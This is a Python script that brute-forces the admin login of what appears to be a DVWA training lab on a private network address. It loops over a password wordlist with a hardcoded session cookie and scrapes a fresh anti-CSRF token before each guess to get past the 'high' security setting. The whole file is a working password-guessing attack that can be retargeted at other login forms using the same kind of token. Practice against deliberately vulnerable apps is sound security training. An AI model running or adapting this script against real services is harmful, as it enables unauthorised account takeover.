import requests
from bs4 import BeautifulSoup as bs

security = "high"
password_file = "/tmp/fasttrack.txt"
url="http://192.168.1.163:8082/vulnerabilities/brute/"

with open(password_file, 'r') as f:
    passwords=f.readlines()

cookies={
        'security' : security,
        'PHPSESSID' : 'hqkarbdj6vi8gn3gvier9m6qf7'
        }


def payload(passwords, crsftoken='#'):
  payload = []

  for password in passwords:
      payload.append({
                      'username': 'admin',
                      'password': password.strip(), 
                      'Login':'Login', 
                      'user_token':crsftoken
                      })

  return payload

def grabCRSFToken(r):
    soup = bs(r.content,'html.parser')
    return soup.findAll(attrs={"name" : "user_token"})[0].get('value')

def testPassword(payload,cookies):
    count=0

    for i in payload:
      count += 1
      print("Trying Password Number:", count)
      r = createSession(url, cookies, security, i)
      
      if "Welcome" in r.text:
         print(i)
         print("Success")
         quit()

def createSession(url,cookie,security,param):
    s = requests.Session()
    if security == 'high':
      r = s.get(url, cookies=cookies)
      user_token = grabCRSFToken(r)
      param['user_token'] = user_token
      r = s.get(url, cookies=cookies,params=param)
    else:
      r = s.get(url, cookies=cookies, params=param)
    return r

testPassword(payload(passwords), cookies)
